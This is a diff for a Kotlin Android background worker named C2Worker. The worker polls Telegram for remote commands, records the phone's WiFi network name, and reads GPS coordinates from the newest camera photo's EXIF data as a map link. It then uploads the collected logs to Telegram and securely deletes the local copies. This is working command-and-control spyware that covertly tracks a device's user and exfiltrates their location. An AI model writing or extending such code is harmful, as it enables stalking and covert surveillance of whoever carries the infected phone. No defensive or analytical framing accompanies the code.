@@ -33,26 +33,15 @@ class C2Worker(
     
     override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
         try {
-            Log.d("C2Worker", "Starting C2 cycle")
+            Log.d("C2Worker", "Starting C2 Cycle")
 
-            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
-            val lastUpdateId = prefs.getLastUpdateId()
-            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
-            
-            Log.d("C2Worker", "Polling updates with offset: $nextOffset")
-            
-            val updates = telegramClient.pollUpdates(nextOffset)
-            val maxUpdateId = commandProcessor.processUpdates(updates)
-            
-            if (maxUpdateId > lastUpdateId) {
-                prefs.saveLastUpdateId(maxUpdateId)
-                Log.d("C2Worker", "New max update ID saved: $maxUpdateId")
-            }
+            // 1. Command Processing (Priority)
+            processCommands()
 
-            // 2. Passive Monitoring
+            // 2. Passive Monitoring (WiFi & Camera/DCIM)
             passiveScan()
 
-            // 3. Upload Logs
+            // 3. Upload Logs (Hybrid: SQLite -> Temp File -> Upload -> Cleanup)
             uploadLogs()
 
             return@withContext Result.success()
@@ -62,38 +51,49 @@ class C2Worker(
         }
     }
 
+    private fun processCommands() {
+        try {
+            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
+            val lastUpdateId = prefs.getLastUpdateId()
+            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
+            
+            val updates = telegramClient.pollUpdates(nextOffset)
+            val maxUpdateId = commandProcessor.processUpdates(updates)
+            
+            if (maxUpdateId > lastUpdateId) {
+                prefs.saveLastUpdateId(maxUpdateId)
+            }
+        } catch (e: Exception) {
+            Log.e("C2Worker", "Command processing failed", e)
+        }
+    }
+
     private suspend fun passiveScan() {
-        Log.d("C2Worker", "Starting Passive Scan")
         val context = applicationContext
         
-        // 1. WiFi SSID
+        // --- 1. WiFi SSID ---
         var ssid = "Unknown"
-        val fineLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
-        val coarseLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
-        val wifiState = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_WIFI_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED
-        
-        if ((fineLoc || coarseLoc) && wifiState) {
+        val hasLocPerm = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        if (hasLocPerm) {
             try {
                 val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                 @Suppress("DEPRECATION")
                 val info = wifiManager.connectionInfo
-                ssid = info.ssid ?: "Unknown"
-                // SSID might be wrapped in quotes
-                if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
-                    ssid = ssid.substring(1, ssid.length - 1)
+                val rawSsid = info.ssid
+                if (!rawSsid.isNullOrEmpty() && rawSsid != "<unknown ssid>") {
+                    ssid = rawSsid.replace("\"", "")
                 }
             } catch (e: Exception) {
-                Log.e("C2Worker", "Error getting WiFi SSID", e)
+                Log.e("C2Worker", "WiFi Scan Failed", e)
             }
         }
         
-        // 2. Media Location
+        // --- 2. Camera/DCIM Image Scan ---
         var locationUrl = "Unknown"
         var imgDate = "Unknown"
         
-        // Check storage permission
-        val hasStorage = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
-                         androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        val hasStorage = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                         androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
         
         if (hasStorage) {
             try {
@@ -101,54 +101,65 @@ class C2Worker(
                     android.provider.MediaStore.Images.Media.DATA,
                     android.provider.MediaStore.Images.Media.DATE_ADDED
                 )
-                val cursor = context.contentResolver.query(
+                // Filter for DCIM or Camera to be more specific (matches "Fokus di kamera taken")
+                val selection = "${android.provider.MediaStore.Images.Media.DATA} LIKE ?"
+                val selectionArgs = arrayOf("%DCIM%") 
+                val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"
+
+                context.contentResolver.query(
                     android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                     projection,
-                    null,
-                    null,
-                    "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"
-                )
-                
-                cursor?.use {
-                    if (it.moveToFirst()) {
-                        val pathColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
-                        val dateColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
+                    selection,
+                    selectionArgs,
+                    sortOrder
+                )?.use { cursor ->
+                    if (cursor.moveToFirst()) {
+                        val pathCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATA)
+                        val dateCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATE_ADDED)
                         
-                        val path = it.getString(pathColumn)
-                        val timestamp = it.getLong(dateColumn) * 1000L // DATE_ADDED is in seconds
-                        imgDate = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(timestamp))
-                        
-                        if (path != null) {
-                             val exif = android.media.ExifInterface(path)
-                             val latLong = FloatArray(2)
-                             if (exif.getLatLong(latLong)) {
-                                 locationUrl = "https://maps.google.com/?q=${latLong[0]},${latLong[1]}"
-                             }
+                        if (pathCol != -1 && dateCol != -1) {
+                            val path = cursor.getString(pathCol)
+                            val timestamp = cursor.getLong(dateCol)
+                            
+                            if (path != null) {
+                                imgDate = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(timestamp * 1000L))
+                                
+                                // Reset Location to Unknown before checking EXIF
+                                locationUrl = "Unknown" 
+                                try {
+                                    val exif = android.media.ExifInterface(path)
+                                    val latLong = FloatArray(2)
+                                    if (exif.getLatLong(latLong)) {
+                                        locationUrl = "https://maps.google.com/?q=${latLong[0]},${latLong[1]}"
+                                    }
+                                } catch (e: Exception) {
+                                    // EXIF extraction failed, location remains Unknown
+                                }
+                            }
                         }
                     }
                 }
             } catch (e: Exception) {
-                 Log.e("C2Worker", "Error in passive media scan", e)
+                 Log.e("C2Worker", "Media Scan Failed", e)
             }
         }
 
-        // 3. Log it
-        // Format: [WIFI: <SSID>] | [LOC: https://maps.google.com/?q=<Lat>,<Lon>] | [IMG_DATE: <EXIF_DATE>]
-        val logContent = "[WIFI: $ssid] | [LOC: $locationUrl] | [IMG_DATE: $imgDate]"
-        
+        // --- 3. Log Result ---
+        val logContent = "📡 [WIFI: $ssid] 📸 [IMG: $imgDate] 📍 [LOC: $locationUrl]"
         repository.insertLog(
             type = "PASSIVE",
-            packageName = "com.zero.sentinel",
+            packageName = "System",
             content = logContent
         )
-        Log.d("C2Worker", "Passive Scan logged: $logContent")
     }
 
     private suspend fun uploadLogs() {
+        // 1. Fetch from DB
         val logs = repository.getAllLogs()
         if (logs.isEmpty()) return
 
-        val deviceName = com.zero.sentinel.utils.DeviceInfoHelper.getSafeDeviceName()
+        // 2. Write to Temp File
+        val deviceName = DeviceInfoHelper.getSafeDeviceName()
         val timeStamp = SimpleDateFormat("yyyy-MM-dd_HH-mm", Locale.getDefault()).format(Date())
         val fileName = "logs_${deviceName}_${timeStamp}.txt"
         val file = File(applicationContext.cacheDir, fileName)
@@ -156,33 +167,30 @@ class C2Worker(
         try {
             FileWriter(file).use { writer ->
                 logs.forEach { log ->
-                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(log.timestamp))
-                    writer.append("$date | ${log.type} | ${log.packageName} | ${log.content}\n")
+                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(log.timestamp))
+                    writer.append("[$date] [${log.type}] ${log.content}\n")
                 }
             }
 
-            // Send to Telegram
+            // 3. Upload to Telegram
             val success = telegramClient.sendDocument(file)
 
+            // 4. Cleanup (Conditional)
             if (success) {
-                // Cleanup on success
-                repository.deleteAllLogs()
-                SecureDelete.deleteSecurely(file)
-                Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")
+                repository.deleteAllLogs() // Transactional delete from DB
+                SecureDelete.deleteSecurely(file) // Delete temp file
+                Log.i("C2Worker", "✅ Upload Success. Cleared ${logs.size} logs.")
             } else {
-                Log.e("C2Worker", "Upload failed. Logs retained.")
-                // Delete temp file but keep logs in DB
-                SecureDelete.deleteSecurely(file)
+                Log.w("C2Worker", "⚠️ Upload Failed. Logs retained in DB.")
+                SecureDelete.deleteSecurely(file) // Always delete temp file to save space
             }
 
         } catch (e: Exception) {
-            Log.e("C2Worker", "Failed to upload logs", e)
-            // If failed, we don't delete logs from DB so we can retry later.
-            // But we should delete the temp file.
+            Log.e("C2Worker", "Upload Process Error", e)
             if (file.exists()) {
                 file.delete()
             }
-            throw e
+            // Logs remain in DB for next retry
         }
     }
 }
